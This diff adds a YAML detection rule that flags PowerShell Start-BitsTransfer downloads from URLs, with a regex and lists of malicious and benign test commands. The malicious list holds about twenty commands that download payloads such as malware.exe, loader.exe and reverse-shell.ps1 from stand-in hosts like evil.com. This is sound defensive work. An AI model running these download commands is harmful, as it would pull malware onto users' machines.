@@ -1,0 +1,46 @@
+name: high-19-start-bitstransfer
+severity: high
+description: >
+  Detects Start-BitsTransfer downloading files from URLs. PowerShell cmdlet abused for malware downloads.
+
+pattern: |
+  (?i)Start-BitsTransfer[\s\r\n]+(?:[^\r\n]*?-(?:Source|Destination|DisplayName|Description|Priority|TransferType)[\s\r\n]+)*[^\r\n]*?(?:-Source[\s\r\n]+)?(?:['"])?(?:http://|https://|ftp://)
+
+malicious:
+  - "Start-BitsTransfer -Source http://evil.com/malware.exe -Destination C:\\malware.exe"
+  - 'Start-BitsTransfer -Source "https://attacker.com/payload.dll" -Destination payload.dll'
+  - 'powershell -c "Start-BitsTransfer -Source http://malware.com/backdoor.exe -Destination backdoor.exe"'
+  - "Start-BitsTransfer -Source ftp://evil.com/trojan.exe -Destination C:\\Temp\\trojan.exe"
+  - "Start-BitsTransfer http://bad.com/dropper.dll C:\\dropper.dll"
+  - "Start-BitsTransfer -Source https://192.168.1.100/clickfix.exe -Destination C:\\Windows\\Temp\\clickfix.exe"
+  - "Start-BitsTransfer -Source 'http://evil.com/ransomware.exe' -Destination 'C:\\Users\\Public\\ransomware.exe'"
+  - "powershell Start-BitsTransfer -Source http://malware.com/implant.ps1 -Destination implant.ps1"
+  - "Start-BitsTransfer -Source https://attacker.com/stage2.dll -Destination C:\\Temp\\stage2.dll -Priority Foreground"
+  - "Start-BitsTransfer -Source ftp://evil.com/backdoor.exe -Destination backdoor.exe"
+  - 'powershell -nop -ep bypass -c "Start-BitsTransfer -Source http://evil.com/loader.exe -Destination loader.exe"'
+  - "Start-BitsTransfer -Source http://malware.com/reverse-shell.ps1 -Destination C:\\ProgramData\\rs.ps1"
+  - "Start-BitsTransfer -Source https://evil.com/trojan.dll -Destination C:\\Windows\\Temp\\trojan.dll"
+  - "Start-BitsTransfer http://attacker.com/clickfix-installer.msi C:\\Temp\\installer.msi"
+  - 'powershell.exe -Command "Start-BitsTransfer -Source ''https://evil.com/malware.exe'' -Destination ''malware.exe''"'
+  - "Start-BitsTransfer -Source http://evil.com/dropper.vbs -Destination C:\\Users\\victim\\AppData\\Local\\Temp\\dropper.vbs"
+  - "Start-BitsTransfer -Source ftp://192.168.1.50/payload.bin -Destination payload.bin"
+  - "Start-BitsTransfer -Source https://malware.com/obfuscated.ps1 -Destination obfuscated.ps1 -Description 'Update'"
+  - "Start-BitsTransfer -Source http://evil.com/persistence.exe -Destination C:\\ProgramData\\persistence.exe"
+  - "powershell Start-BitsTransfer -Source 'http://attacker.com/exploit.dll' -Destination 'exploit.dll'"
+
+benign:
+  - "Start-BitsTransfer -Source C:\\Source\\file.zip -Destination D:\\Backup\\"
+  - "Get-BitsTransfer"
+  - "Complete-BitsTransfer"
+  - "Remove-BitsTransfer -BitsJob (Get-BitsTransfer)"
+  - "Start-BitsTransfer -Source \\\\server\\share\\file.exe -Destination C:\\Local\\"
+  - "Start-BitsTransfer -Source \\\\fileserver\\updates\\patch.msi -Destination C:\\Temp\\patch.msi"
+  - "Start-BitsTransfer -Source C:\\Downloads\\archive.zip -Destination D:\\Backup\\archive.zip"
+  - "Get-BitsTransfer | Complete-BitsTransfer"
+  - "Start-BitsTransfer -Source \\\\nas\\software\\installer.exe -Destination C:\\Installers\\"
+  - "Remove-BitsTransfer -Name 'MyTransfer'"
+  - "Start-BitsTransfer -Source E:\\Media\\video.mp4 -Destination C:\\Users\\user\\Videos\\video.mp4"
+  - "Get-BitsTransfer | Where-Object {$_.JobState -eq 'Transferred'} | Complete-BitsTransfer"
+  - "Start-BitsTransfer -Source \\\\domain\\netlogon\\script.ps1 -Destination C:\\Scripts\\"
+  - "Suspend-BitsTransfer -BitsJob (Get-BitsTransfer)"
+  - "Resume-BitsTransfer -BitsJob (Get-BitsTransfer)"
